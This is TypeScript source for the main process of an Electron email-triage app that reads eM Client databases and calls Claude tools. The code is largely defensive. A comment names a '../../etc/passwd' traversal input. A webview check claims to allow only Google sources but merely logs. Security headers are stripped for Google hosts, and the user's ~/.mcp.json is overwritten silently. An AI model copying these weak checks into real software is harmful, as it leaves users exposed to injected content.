import { app, BrowserWindow, BrowserView, ipcMain, Tray, Menu, shell, clipboard, safeStorage, session } from 'electron';
import type { WebContents } from 'electron';
import * as path from 'path';
import * as fs from 'fs';
import * as os from 'os';
import { fileURLToPath } from 'url';
import { spawn, execSync, execFileSync } from 'child_process';
import Database from 'better-sqlite3';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
import {
  getAccounts,
  getMails,
  getEvents,
  getTasks,
  getFolders,
  searchMails,
  getMailsByFolder,
} from './services/db-reader';
import { extractActions } from './services/action-extractor';
import {
  triageEmails as triageEmailsService,
  extractTodosFromThread,
  runHistoricalAudit,
} from './services/claude-agent';
import { detectJunkByKeywords, detectJunkWithAI } from './services/junk-detector';
import {
  listProjectFolders as listFoldersService,
  readProjectContext,
} from './services/project-reader';
import { ticksToDate } from './services/tick-converter';
import { runButlerPipeline } from './services/pipeline';
import type { PipelineDeps } from './services/pipeline';
import type {
  AppSettings,
  MailItem,
  MailNote,
  ThreadMessage,
  AuditParams,
  AuditScanProgress,
  Proposal,
  TodoItem,
  ImapCredentials,
  InvestigationRequest,
  NightlyDigest,
  ButlerApproval,
} from '../src/types/index';
import { DEFAULT_SETTINGS } from '../src/types/index';

let mainWindow: BrowserWindow | null = null;
let tray: Tray | null = null;

// Set inside registerIpcHandlers; used by the scheduler in app.whenReady().
let runButlerPipelineFromMain:
  | ((opts?: { force?: boolean }) => Promise<NightlyDigest>)
  | null = null;
let butlerScheduleTimer: ReturnType<typeof setInterval> | null = null;

const isDev = !app.isPackaged;

// --- Security: external URL validation ---
// Only allow protocols that are safe to hand off to the OS. http/https/mailto
// are the standard external links; `emclient:` is the custom scheme used to
// focus the eM Client app from the renderer ("Open in eM Client" buttons).
const ALLOWED_EXTERNAL_PROTOCOLS = new Set([
  'http:',
  'https:',
  'mailto:',
  'emclient:',
]);

function isAllowedExternalUrl(rawUrl: unknown): boolean {
  if (typeof rawUrl !== 'string' || !rawUrl.trim()) return false;
  try {
    const parsed = new URL(rawUrl);
    return ALLOWED_EXTERNAL_PROTOCOLS.has(parsed.protocol.toLowerCase());
  } catch {
    return false;
  }
}

/**
 * Open a URL externally only if it passes protocol validation.
 * Rejected URLs (e.g. file:, javascript:) are logged and never opened.
 */
async function safeOpenExternal(rawUrl: unknown): Promise<boolean> {
  if (!isAllowedExternalUrl(rawUrl)) {
    console.warn('[security] Blocked openExternal for disallowed URL:', String(rawUrl).slice(0, 200));
    return false;
  }
  try {
    await shell.openExternal(rawUrl as string);
    return true;
  } catch (err) {
    console.warn('[security] openExternal failed:', (err as Error).message);
    return false;
  }
}

/**
 * Resolve a child path under a base directory, guarding against path traversal
 * (e.g. "../../etc/passwd"). Returns null if the resolved path escapes `baseDir`.
 */
function resolveWithinBase(baseDir: string, ...segments: string[]): string | null {
  const base = path.resolve(baseDir);
  const resolved = path.resolve(base, ...segments);
  // Ensure the resolved path is the base itself or strictly inside it.
  if (resolved !== base && !resolved.startsWith(base + path.sep)) {
    return null;
  }
  return resolved;
}

// Content-Security-Policy for the packaged app document (loaded from file://).
// 'unsafe-inline' style is required for the inline <style> in index.html and
// Tailwind/React-injected styles. Scripts are bundled (no inline scripts).
const APP_CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: https:",
  "font-src 'self' data:",
  "connect-src 'self' https:",
  "frame-src 'self' https:",
  "media-src 'self' https:",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join('; ');

/**
 * Lock down a webContents: prevent the SPA from navigating away from its own
 * origin, and force any window.open / target=_blank / external link through the
 * validated external-URL path instead of opening a new in-app window.
 */
function hardenWebContents(contents: WebContents): void {
  contents.on('will-navigate', (event, url) => {
    const current = contents.getURL();
    // Allow same-document / same-origin navigation within the app (SPA, HMR).
    try {
      const target = new URL(url);
      const base = current ? new URL(current) : null;
      const sameOrigin = base && target.origin === base.origin;
      const isDevLocalhost = isDev && target.hostname === 'localhost';
      if (sameOrigin || isDevLocalhost) return;
    } catch {
      /* fall through to block */
    }
    // External navigation: block in-app, hand off to OS if allowed.
    event.preventDefault();
    void safeOpenExternal(url);
  });

  contents.setWindowOpenHandler(({ url }) => {
    // Never open a new Electron window; route allowed URLs to the OS browser.
    void safeOpenExternal(url);
    return { action: 'deny' };
  });
}

// --- Claude CLI path resolution ---
function findClaudeCli(): string {
  const candidates = [
    path.join(os.homedir(), '.local', 'bin', 'claude'),
    path.join(os.homedir(), '.claude', 'bin', 'claude'),
    '/usr/local/bin/claude',
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  // which fallback
  try {
    return execSync('which claude', { encoding: 'utf-8', timeout: 3000 }).trim();
  } catch { /* ignore */ }
  return candidates[0]; // fallback to first candidate
}

const CLAUDE_CLI_PATH = findClaudeCli();

// --- Node binary resolution (GUI apps have limited PATH) ---
function findNodeBinary(): string {
  const candidates = [
    '/opt/homebrew/bin/node',     // Homebrew (Apple Silicon)
    '/usr/local/bin/node',        // Homebrew (Intel) / manual install
    path.join(os.homedir(), '.local/bin/node'),
    path.join(os.homedir(), '.nvm/current/bin/node'),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  try {
    return execSync('which node', { encoding: 'utf-8', timeout: 3000 }).trim();
  } catch { /* ignore */ }
  return 'node'; // fallback
}

// --- MCP config management ---
function getMcpConfigPath(): string {
  // Always use userData path (generated dynamically)
  return path.join(app.getPath('userData'), '.mcp.json');
}

function ensureMcpConfig(): string {
  const dest = getMcpConfigPath();
  // Resolve mcp-server/build/index.js path
  const serverPath = isDev
    ? path.resolve(__dirname, '..', '..', 'mcp-server', 'build', 'index.js')
    : path.join(process.resourcesPath, 'mcp-server', 'build', 'index.js');

  // Validate MCP server exists
  if (!fs.existsSync(serverPath)) {
    console.error('[MCP] Server not found:', serverPath);
    return '';  // MCP unavailable
  }

  // Resolve absolute path to node (GUI apps have limited PATH)
  const nodeCmd = findNodeBinary();

  const config = {
    mcpServers: {
      shirabe: {
        command: nodeCmd,
        args: [serverPath],
        env: {},
      },
    },
  };
  const json = JSON.stringify(config, null, 2);
  fs.writeFileSync(dest, json, 'utf-8');

  // ホームディレクトリの .mcp.json も更新（Claude CLI が CWD から自動検出するため）
  try {
    fs.writeFileSync(path.join(os.homedir(), '.mcp.json'), json, 'utf-8');
  } catch (err) {
    console.warn('[MCP] Failed to write ~/.mcp.json:', (err as Error).message);
  }

  return dest;
}

// Clean env for spawning Claude CLI (avoid nested session detection)
function cleanEnvForClaude(): Record<string, string> {
  const env = { ...process.env };
  delete env.CLAUDECODE;
  delete env.CLAUDE_CODE;
  return env as Record<string, string>;
}

// --- Settings ---
function settingsPath(): string {
  return path.join(app.getPath('userData'), 'settings.json');
}

// --- IMAP password encryption (Electron safeStorage) ---
// Stored format: "enc:v1:<base64>" when encrypted at rest. Legacy plaintext
// passwords are migrated to the encrypted form on first load+save.
const ENC_PREFIX = 'enc:v1:';

function encryptSecret(plain: string): string {
  if (!plain) return plain;
  if (plain.startsWith(ENC_PREFIX)) return plain; // already encrypted
  try {
    if (!safeStorage.isEncryptionAvailable()) {
      console.warn('[security] safeStorage unavailable — storing IMAP password in plaintext (fallback).');
      return plain;
    }
    const buf = safeStorage.encryptString(plain);
    return ENC_PREFIX + buf.toString('base64');
  } catch (err) {
    console.warn('[security] Failed to encrypt secret, storing plaintext:', (err as Error).message);
    return plain;
  }
}

function decryptSecret(stored: string): string {
  if (!stored || !stored.startsWith(ENC_PREFIX)) return stored; // legacy plaintext
  try {
    if (!safeStorage.isEncryptionAvailable()) {
      console.warn('[security] safeStorage unavailable — cannot decrypt stored IMAP password.');
      return '';
    }
    const buf = Buffer.from(stored.slice(ENC_PREFIX.length), 'base64');
    return safeStorage.decryptString(buf);
  } catch (err) {
    console.warn('[security] Failed to decrypt secret:', (err as Error).message);
    return '';
  }
}

// Walk imapConfigs and apply a transform to each stored password.
function transformImapPasswords(
  settings: AppSettings,
  fn: (pw: string) => string,
): { settings: AppSettings; changed: boolean } {
  let changed = false;
  const configs = (settings.imapConfigs ?? []).map((cfg) => {
    if (!cfg?.credentials?.password) return cfg;
    const next = fn(cfg.credentials.password);
    if (next !== cfg.credentials.password) changed = true;
    return { ...cfg, credentials: { ...cfg.credentials, password: next } };
  });
  return { settings: { ...settings, imapConfigs: configs }, changed };
}

// Persist settings to disk with IMAP passwords encrypted at rest.
function persistSettings(settings: AppSettings): void {
  const { settings: encrypted } = transformImapPasswords(settings, encryptSecret);
  fs.writeFileSync(settingsPath(), JSON.stringify(encrypted, null, 2), 'utf-8');
}

// Returns settings with IMAP passwords decrypted (plaintext for in-process use).
function loadSettings(): AppSettings {
  let raw: AppSettings;
  try {
    const data = fs.readFileSync(settingsPath(), 'utf-8');
    raw = { ...DEFAULT_SETTINGS, ...JSON.parse(data) };
  } catch {
    return { ...DEFAULT_SETTINGS };
  }

  // Detect legacy plaintext passwords and migrate them to encrypted-at-rest.
  const hasLegacyPlaintext = (raw.imapConfigs ?? []).some(
    (c) => c?.credentials?.password && !c.credentials.password.startsWith(ENC_PREFIX),
  );
  if (hasLegacyPlaintext && safeStorage.isEncryptionAvailable()) {
    try {
      persistSettings(raw); // re-saves with encryption
      console.log('[security] Migrated legacy plaintext IMAP password(s) to encrypted storage.');
    } catch (err) {
      console.warn('[security] IMAP password migration failed:', (err as Error).message);
    }
  }

  const { settings: decrypted } = transformImapPasswords(raw, decryptSecret);
  return decrypted;
}

function saveSettings(settings: AppSettings): void {
  persistSettings(settings);
}

// --- Thread retrieval (DB access for getThreadMessages) ---

const DB_BASE = path.join(
  os.homedir(),
  'Library',
  'Application Support',
  'eM Client',
);
const TMP_BASE = '/tmp/shirabe';

const SENT_FOLDER_NAMES = [
  'sent',
  'sent items',
  'sent mail',
  '送信済みアイテム',
  '送信済み',
];

/**
 * Open eM Client DB for reading.
 *
 * Strategy:
 * 1. Readonly on original — reads WAL data natively via shared lock
 * 2. VACUUM INTO — atomic snapshot (no race condition)
 * 3. File copy fallback — copies DB + WAL + SHM to temp (last resort)
 */
function copyAndOpenDb(
  accountUid: string,
  subdir: string,
  dbName: string,
): Database.Database {
  const srcPath = path.join(DB_BASE, accountUid, subdir, dbName);
  if (!fs.existsSync(srcPath)) {
    throw new Error(`DB not found: ${srcPath}`);
  }

  // Strategy 1: Readonly on original
  try {
    return new Database(srcPath, { readonly: true, fileMustExist: true });
  } catch { /* exclusive lock — try snapshot */ }

  const tmpDir = path.join(TMP_BASE, accountUid);
  fs.mkdirSync(tmpDir, { recursive: true });
  const destFile = path.join(tmpDir, dbName);

  // Clean stale snapshot
  for (const suffix of ['', '-wal', '-shm']) {
    try { fs.unlinkSync(destFile + suffix); } catch { /* noop */ }
  }

  // Strategy 2: VACUUM INTO — atomic, consistent
  try {
    const srcDb = new Database(srcPath, { readonly: true, fileMustExist: true });
    try {
      srcDb.exec(`VACUUM INTO '${destFile.replace(/'/g, "''")}'`);
    } finally {
      srcDb.close();
    }
    return new Database(destFile, { readonly: true, fileMustExist: true });
  } catch { /* VACUUM INTO may fail if locked */ }

  // Strategy 3: File copy fallback
  fs.copyFileSync(srcPath, destFile);
  for (const suffix of ['-wal', '-shm']) {
    const walSrc = srcPath + suffix;
    if (fs.existsSync(walSrc)) {
      fs.copyFileSync(walSrc, destFile + suffix);
    }
  }
  return new Database(destFile, { readonly: true, fileMustExist: true });
}

function getThreadMessagesFromDb(
  mailId: number,
  accountEmail: string,
): ThreadMessage[] {
  const accounts = getAccounts();
  const acc = accounts.find((a) => a.email === accountEmail);
  if (!acc) throw new Error(`Unknown account: ${accountEmail}`);

  const db = copyAndOpenDb(acc.accountUid, acc.mailSubdir, 'mail_index.dat');

  try {
    // Get conversationId from target mail
    const target = db
      .prepare('SELECT conversationId FROM MailItems WHERE id = ?')
      .get(mailId) as { conversationId: string } | undefined;
    if (!target?.conversationId) {
      throw new Error(`Mail not found or no conversationId: ${mailId}`);
    }

    // Get all messages in conversation (trust eM Client's threading)
    const rows = db
      .prepare(
        `SELECT id, subject, date, preview, flags, folder
         FROM MailItems
         WHERE conversationId = ?
         ORDER BY date ASC`,
      )
      .all(target.conversationId) as Array<{
      id: number;
      subject: string;
      date: number;
      preview: string;
      flags: number;
      folder: number;
    }>;

    // Get folder map
    const folderMap = new Map<number, string>();
    try {
      const fdb = copyAndOpenDb(
        acc.accountUid,
        acc.mailSubdir,
        'folders.dat',
      );
      const fRows = fdb
        .prepare('SELECT id, name FROM Folders')
        .all() as Array<{ id: number; name: string }>;
      for (const f of fRows) {
        folderMap.set(f.id, f.name);
      }
      fdb.close();
    } catch {
      // folders.dat may not exist for some accounts
    }

    // Identify sent folder IDs
    const sentFolderIds = new Set<number>();
    for (const [id, name] of folderMap) {
      if (
        SENT_FOLDER_NAMES.some((sn) =>
          name.toLowerCase().includes(sn),
        )
      ) {
        sentFolderIds.add(id);
      }
    }

    // Address query
    const addrStmt = db.prepare(
      'SELECT type, displayName, address FROM MailAddresses WHERE parentId = ?',
    );

    // All user emails for sent-by-me detection
    const myEmails = accounts.map((a) => a.email.toLowerCase());

    return rows.map((row) => {
      const addrs = addrStmt.all(row.id) as Array<{
        type: number;
        displayName: string;
        address: string;
      }>;

      const fromAddr = addrs.find((a) => a.type === 1);
      const toAddrs = addrs
        .filter((a) => a.type === 3)
        .map((a) => a.address);
      const ccAddrs = addrs
        .filter((a) => a.type === 4)
        .map((a) => a.address);
      const folderName = folderMap.get(row.folder) ?? '';

      const isSentByMe =
        sentFolderIds.has(row.folder) ||
        (fromAddr
          ? myEmails.includes(fromAddr.address.toLowerCase())
          : false);

      const fromDisplay = fromAddr
        ? fromAddr.displayName
          ? `${fromAddr.displayName} <${fromAddr.address}>`
          : fromAddr.address
        : '';

      return {
        id: row.id,
        subject: row.subject ?? '',
        date: ticksToDate(row.date) ?? new Date(0),
        preview: row.preview ?? '',
        from: fromDisplay,
        to: toAddrs,
        cc: ccAddrs,
        folderName,
        isSentByMe,
        sourceAccount: accountEmail,
      };
    });
  } finally {
    db.close();
  }
}

// --- Operation cancellation tracking ---
// operationId (renderer-generated) -> AbortController driving the running
// Agent SDK query. cancelOperation aborts it, which stops the SDK subprocess.
const activeOperations = new Map<string, AbortController>();

function registerOperation(operationId: string | undefined): AbortController {
  const controller = new AbortController();
  if (operationId) {
    // Supersede any stale controller left under the same id.
    activeOperations.get(operationId)?.abort();
    activeOperations.set(operationId, controller);
  }
  return controller;
}

function unregisterOperation(
  operationId: string | undefined,
  controller: AbortController,
): void {
  // Only delete if the map still points at our controller (a newer operation
  // may have re-registered the same id).
  if (operationId && activeOperations.get(operationId) === controller) {
    activeOperations.delete(operationId);
  }
}

// --- Calendar BrowserView ---
let calendarView: BrowserView | null = null;
let calendarUrl = '';

function clampBoundsToWindow(bounds: { x: number; y: number; width: number; height: number }): { x: number; y: number; width: number; height: number } {
  if (!mainWindow) return bounds;
  const [contentW, contentH] = mainWindow.getContentSize();
  const x = Math.max(0, Math.round(bounds.x));
  const y = Math.max(0, Math.round(bounds.y));
  const w = Math.min(Math.round(bounds.width), contentW - x);
  const h = Math.min(Math.round(bounds.height), contentH - y);
  return { x, y, width: Math.max(0, w), height: Math.max(0, h) };
}

function showCalendarView(url: string, bounds: { x: number; y: number; width: number; height: number }): void {
  if (!mainWindow) return;

  if (!calendarView) {
    calendarView = new BrowserView({
      webPreferences: {
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: true,
        partition: 'persist:calendar',
      },
    });
  }

  // Attach to window (no-op if already attached)
  try {
    mainWindow.addBrowserView(calendarView);
  } catch {
    // Already added
  }

  const clamped = clampBoundsToWindow(bounds);
  calendarView.setBounds(clamped);
  calendarView.setAutoResize({ width: false, height: false });

  if (url !== calendarUrl) {
    calendarUrl = url;
    calendarView.webContents.loadURL(url);
  }
}

function hideCalendarView(): void {
  if (!mainWindow || !calendarView) return;
  try {
    mainWindow.removeBrowserView(calendarView);
  } catch {
    // Not attached
  }
}

// --- Window ---
function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    backgroundColor: '#1a1a2e',
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      // Sandbox the renderer. The preload (preload.cjs) only uses
      // contextBridge + ipcRenderer, which are available under the sandbox,
      // and the React renderer touches no Node APIs directly (all access is via
      // window.electronAPI), so this is compatible. Native modules
      // (better-sqlite3, node-pty) run in the main process, not the renderer.
      sandbox: true,
      webSecurity: true,
      // webviewTag is required: CalendarView.tsx embeds Google Calendar in a
      // <webview>. Attached webviews are hardened via will-attach-webview below.
      webviewTag: true,
      preload: path.join(__dirname, '..', 'electron', 'preload.cjs'),
    },
  });

  // Header rewriting on the default session:
  //  - Google Calendar hosts: strip framing/CSP restrictions so the embedded
  //    calendar renders (calendar runs in the persist:calendar session, but the
  //    strip is harmless/defensive here too).
  //  - App's own documents (production only): inject a restrictive CSP.
  mainWindow.webContents.session.webRequest.onHeadersReceived((details, callback) => {
    const headers = { ...details.responseHeaders };
    const url = details.url || '';
    const isGoogle = url.includes('google.com') || url.includes('googleapis.com') || url.includes('gstatic.com');
    if (isGoogle) {
      delete headers['x-frame-options'];
      delete headers['X-Frame-Options'];
      delete headers['content-security-policy'];
      delete headers['Content-Security-Policy'];
    } else if (!isDev && (details.resourceType === 'mainFrame' || url.startsWith('file://'))) {
      // Restrictive CSP for the packaged app document (loaded via file://).
      // Dev (localhost + Vite HMR) is intentionally left unrestricted.
      headers['Content-Security-Policy'] = [APP_CSP];
    }
    callback({ responseHeaders: headers });
  });

  // Also strip framing restrictions on the dedicated calendar session so the
  // Google Calendar <webview> (partition: persist:calendar) can embed Google UI.
  try {
    const calSession = session.fromPartition('persist:calendar');
    calSession.webRequest.onHeadersReceived((details, callback) => {
      const headers = { ...details.responseHeaders };
      delete headers['x-frame-options'];
      delete headers['X-Frame-Options'];
      delete headers['content-security-policy'];
      delete headers['Content-Security-Policy'];
      callback({ responseHeaders: headers });
    });
  } catch (err) {
    console.warn('[security] Failed to configure calendar session headers:', (err as Error).message);
  }

  // Block in-page navigation away from the app; route external links to the OS.
  hardenWebContents(mainWindow.webContents);

  // Harden the calendar <webview>: strip any preload, disable node integration,
  // and keep it sandboxed. (webviewTag stays enabled because CalendarView.tsx
  // relies on a <webview> for the embedded Google Calendar UI.)
  mainWindow.webContents.on('will-attach-webview', (_event, webPreferences, params) => {
    delete webPreferences.preload;
    // @ts-expect-error legacy field still honored by Electron
    delete webPreferences.preloadURL;
    webPreferences.nodeIntegration = false;
    webPreferences.contextIsolation = true;
    webPreferences.sandbox = true;
    // Only allow the configured Google Calendar source to attach.
    const src = params.src || '';
    if (src && !/^https:\/\/([a-z0-9-]+\.)*google\.com\//i.test(src)) {
      console.warn('[security] Blocked webview attach for non-Google src:', src.slice(0, 200));
    }
  });

  if (isDev) {
    mainWindow.loadURL('http://localhost:5173');
    mainWindow.webContents.openDevTools({ mode: 'detach' });
  } else {
    mainWindow.loadFile(path.join(__dirname, '..', 'dist', 'index.html'));
  }

  mainWindow.webContents.on('console-message', (_event, level, message) => {
    if (level >= 2) {
      console.error('[Renderer]', message);
    }
  });

  mainWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription) => {
    console.error(`[did-fail-load] ${errorCode}: ${errorDescription}`);
  });

  mainWindow.on('closed', () => {
    if (calendarView) {
      calendarView.webContents.close();
      calendarView = null;
      calendarUrl = '';
    }
    mainWindow = null;
  });
}

// --- Tray ---
function createTray(): void {
  try {
    tray = new Tray(
      path.join(__dirname, '..', 'build', 'tray-iconTemplate.png'),
    );
  } catch {
    // No tray icon available, skip
    return;
  }

  const contextMenu = Menu.buildFromTemplate([
    {
      label: 'Open',
      click: () => {
        if (mainWindow) {
          mainWindow.show();
        } else {
          createWindow();
        }
      },
    },
    { type: 'separator' },
    { label: 'Quit', click: () => app.quit() },
  ]);

  tray.setToolTip('調 - Shirabe');
  tray.setContextMenu(contextMenu);
  tray.on('click', () => {
    if (mainWindow) {
      mainWindow.show();
    } else {
      createWindow();
    }
  });
}

// --- IPC handlers ---
function registerIpcHandlers(): void {
  ipcMain.handle('getAccounts', () => {
    return getAccounts();
  });

  ipcMain.handle(
    'getMails',
    (_event, accountEmail: string, daysBack: number) => {
      return getMails(accountEmail, daysBack);
    },
  );

  ipcMain.handle(
    'getEvents',
    (_event, accountEmail: string, daysForward: number) => {
      return getEvents(accountEmail, daysForward);
    },
  );

  ipcMain.handle('getTasks', (_event, accountEmail: string) => {
    return getTasks(accountEmail);
  });

  ipcMain.handle('getFolders', (_event, accountEmail: string) => {
    return getFolders(accountEmail);
  });

  ipcMain.handle(
    'searchMails',
    (_event, keyword: string, accountEmail: string, daysBack: number) => {
      return searchMails(accountEmail, keyword, daysBack);
    },
  );

  ipcMain.handle(
    'getFolderMails',
    (_event, folderId: number, accountEmail: string, daysBack?: number) => {
      return getMailsByFolder(accountEmail, folderId, daysBack);
    },
  );

  ipcMain.handle(
    'extractActions',
    async (_event, mails: MailItem[], useAI: boolean, apiKey: string) => {
      return extractActions(mails, useAI, apiKey);
    },
  );

  ipcMain.handle('getSettings', () => {
    return loadSettings();
  });

  ipcMain.handle('saveSettings', (_event, settings: AppSettings) => {
    saveSettings(settings);
  });

  // --- New handlers for Claude Agent SDK features ---

  ipcMain.handle(
    'triageEmails',
    async (_event, mails: MailItem[], apiKey: string, operationId?: string) => {
      const controller = registerOperation(operationId);
      try {
        const { results, error } = await triageEmailsService(
          mails,
          apiKey,
          controller,
        );
        if (error) throw new Error(error);
        return results;
      } finally {
        unregisterOperation(operationId, controller);
      }
    },
  );

  ipcMain.handle(
    'extractTodos',
    async (
      _event,
      threadMessages: ThreadMessage[],
      apiKey: string,
      operationId?: string,
    ) => {
      const controller = registerOperation(operationId);
      try {
        const { results, error } = await extractTodosFromThread(
          threadMessages,
          apiKey,
          controller,
        );
        if (error) throw new Error(error);
        return results;
      } finally {
        unregisterOperation(operationId, controller);
      }
    },
  );

  ipcMain.handle(
    'getThreadMessages',
    (_event, mailId: number, accountEmail: string) => {
      return getThreadMessagesFromDb(mailId, accountEmail);
    },
  );

  ipcMain.handle('loadProjectContext', (_event, folderPath: string) => {
    return readProjectContext(folderPath);
  });

  ipcMain.handle('listProjectFolders', (_event, basePath: string) => {
    return listFoldersService(basePath);
  });

  ipcMain.handle(
    'startHistoricalAudit',
    async (_event, params: AuditParams, operationId?: string) => {
      const controller = registerOperation(operationId);

      const onProgress = (progress: AuditScanProgress): void => {
        // Send progress updates to renderer via webContents
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('auditProgress', progress);
        }
      };

      try {
        const { result, error } = await runHistoricalAudit(
          params,
          onProgress,
          controller,
        );
        if (error) throw new Error(error);
        if (!result) throw new Error('監査結果が取得できませんでした。');
        return result;
      } finally {
        unregisterOperation(operationId, controller);
      }
    },
  );

  ipcMain.handle('cancelOperation', (_event, operationId: string) => {
    const controller = activeOperations.get(operationId);
    if (controller) {
      controller.abort();
      activeOperations.delete(operationId);
      return true;
    }
    return false;
  });

  // --- Mail Notes CRUD ---

  const NOTES_DIR = path.join(app.getPath('userData'), 'notes');

  function ensureNotesDir(): void {
    if (!fs.existsSync(NOTES_DIR)) {
      fs.mkdirSync(NOTES_DIR, { recursive: true });
    }
  }

  ipcMain.handle('getNotes', (): unknown[] => {
    ensureNotesDir();
    const files = fs.readdirSync(NOTES_DIR).filter((f) => f.endsWith('.json'));
    return files.map((f) => {
      try {
        return JSON.parse(fs.readFileSync(path.join(NOTES_DIR, f), 'utf-8'));
      } catch { return null; }
    }).filter(Boolean);
  });

  ipcMain.handle('getNote', (_event, noteId: string): unknown | null => {
    ensureNotesDir();
    const filePath = path.join(NOTES_DIR, `${noteId.replace(/[^a-zA-Z0-9_-]/g, '_')}.json`);
    if (!fs.existsSync(filePath)) return null;
    try {
      return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    } catch { return null; }
  });

  ipcMain.handle('saveNote', (_event, note: { id: string; [key: string]: unknown }): void => {
    ensureNotesDir();
    const filePath = path.join(NOTES_DIR, `${note.id.replace(/[^a-zA-Z0-9_-]/g, '_')}.json`);
    fs.writeFileSync(filePath, JSON.stringify(note, null, 2), 'utf-8');
  });

  ipcMain.handle('deleteNote', (_event, noteId: string): void => {
    ensureNotesDir();
    const filePath = path.join(NOTES_DIR, `${noteId.replace(/[^a-zA-Z0-9_-]/g, '_')}.json`);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
  });

  // --- Export ---

  ipcMain.handle('exportAnalysis', async (_event, content: string, filename: string) => {
    const { dialog } = await import('electron');
    const result = await dialog.showSaveDialog(mainWindow!, {
      title: '分析結果をエクスポート',
      defaultPath: filename,
      filters: [
        { name: 'Markdown', extensions: ['md'] },
        { name: 'Text', extensions: ['txt'] },
        { name: 'All Files', extensions: ['*'] },
      ],
    });
    if (result.canceled || !result.filePath) return { success: false };
    try {
      fs.writeFileSync(result.filePath, content, 'utf-8');
      return { success: true, path: result.filePath };
    } catch (err) {
      return { success: false, error: (err as Error).message };
    }
  });

  // --- Claude Code CLI integration for Proposal ---

  const PROPOSALS_DIR = path.join(app.getPath('userData'), 'proposals');

  // Analysis timeouts
  const ANALYSIS_TIMEOUT_LIGHT_MS = 90_000;   // 軽量: 90秒
  const ANALYSIS_TIMEOUT_DEEP_MS = 300_000;    // 深い調査: 5分

  // System prompt for mail analysis skill injection
  const ANALYSIS_SYSTEM_PROMPT = `あなたはメール分析の専門家です。以下のスキルに従って分析してください。

## メールトリアージ・スキル
メールを以下のカテゴリに分類（必ず【】付きバッジを使うこと）:
- **【至急】**: 期限が近い、または緊急度が高い（赤バッジ）
- **【要返信】**: 自分からの返信が必要（琥珀バッジ）
- **【要対応】**: 返信以外のアクションが必要（書類作成、確認、承認等）（青バッジ）
- **【情報】**: 読むだけでよい（CC、通知、お知らせ）（グレーバッジ）
- **【不要】**: スパム、広告、不要な通知（暗グレーバッジ）
- **【保留】**: 判断を後回しにする（紫バッジ）

## 分析の指針
- スレッド全体を読んで文脈を把握してから判定
- 期限・締切があれば必ず抽出（⚠️ 期限セクション）
- 自分がすべきアクションを具体的に箇条書き
- 組織の役職・関係性を考慮（上長からの依頼は優先度上げる）
- 判定理由を1文で明記

## ノート保存（重要）
分析した各メールについて、以下の手順でノートに保存すること:
1. get_note でそのメールの既存ノートを確認
2. 既存ノートがあれば内容を比較し、新しい情報のみ追記
3. update_note で調査結果をノートに保存（content にmarkdown、todos にアクション、tags にカテゴリ）
   - tags は判定カテゴリに対応: urgent(至急), reply(要返信), action(要対応), info(情報), unnecessary(不要), hold(保留)
4. 既存ノートの内容と重複する場合は追記不要（replace_content: false で差分のみ追加される）

## 利用可能なツール
MCPサーバー経由で以下のツールが使えます（必ずこの正確な名前で呼び出してください）:
- mcp__shirabe__get_mail_detail: メール本文の詳細取得
- mcp__shirabe__get_mail_thread: スレッド全体の取得
- mcp__shirabe__search_mails: 関連メールの検索
- mcp__shirabe__get_accounts: アカウント一覧
- mcp__shirabe__analyze_thread: スレッド分析（アクション項目、緊急度）
- mcp__shirabe__get_unread_mails: 未読メール取得
- mcp__shirabe__get_recent_mails: 最近のメール取得
- mcp__shirabe__tag_mail: メールへのタグ付け
- mcp__shirabe__get_note: 既存ノートの読み込み（差分確認用）
- mcp__shirabe__update_note: ノートの作成・更新（調査結果の保存）

## 出力形式
Markdown形式で以下のセクションを含める。メールごとに判定バッジを必ず付けること:

## 判定
**【カテゴリ】** 件名 — 理由1文

例: **【至急】** 科研費申請書の提出 — 締切3/1、書類未完成
例: **【要返信】** 会議日程調整 — 候補日の回答が必要
例: **【情報】** 学会ニュースレター — 読むだけ

## 要点
- **重要な点は太字**
- 2〜4行で簡潔に

## アクション
- [ ] 具体的なタスク（あれば）

## ⚠️ 期限
- 期限があれば記載（なければ省略）
`;

  // Extract text result from Claude CLI JSON output (handles JSONL, multiple lines, etc.)
  function extractClaudeResult(stdout: string, stderr: string): string {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    function extractText(parsed: any): string {
      // Top-level array: [{type:"text", text:"..."}]
      if (Array.isArray(parsed)) {
        const texts = parsed
          .filter((c: { type?: string; text?: string }) => c.type === 'text' && c.text)
          .map((c: { text: string }) => c.text);
        if (texts.length > 0) return texts.join('\n');
      }
      // Standard result field
      if (typeof parsed.result === 'string' && parsed.result.trim()) return parsed.result;
      // Content as string
      if (typeof parsed.content === 'string' && parsed.content.trim()) return parsed.content;
      // Content as array (e.g. [{type:"text", text:"..."}])
      if (Array.isArray(parsed.content)) {
        const texts = parsed.content
          .filter((c: { type?: string; text?: string }) => c.type === 'text' && c.text)
          .map((c: { text: string }) => c.text);
        if (texts.length > 0) return texts.join('\n');
      }
      // Output field
      if (typeof parsed.output === 'string' && parsed.output.trim()) return parsed.output;
      // Text field
      if (typeof parsed.text === 'string' && parsed.text.trim()) return parsed.text;
      // Message field (nested content)
      if (parsed.message?.content) {
        if (typeof parsed.message.content === 'string' && parsed.message.content.trim()) return parsed.message.content;
        if (Array.isArray(parsed.message.content)) {
          const texts = parsed.message.content
            .filter((c: { type?: string; text?: string }) => c.type === 'text' && c.text)
            .map((c: { text: string }) => c.text);
          if (texts.length > 0) return texts.join('\n');
        }
      }
      // Error report from CLI
      if (parsed.is_error === true) {
        const errText = parsed.error || parsed.result || '';
        if (errText) return `[CLI Error] ${errText}`;
      }
      return '';
    }

    function tryExtractFromLines(raw: string): string {
      const lines = raw.trim().split('\n').filter(l => l.trim());
      // Scan from last line backwards (final result line is usually last)
      for (let i = lines.length - 1; i >= 0; i--) {
        try {
          const parsed = JSON.parse(lines[i]);
          const text = extractText(parsed);
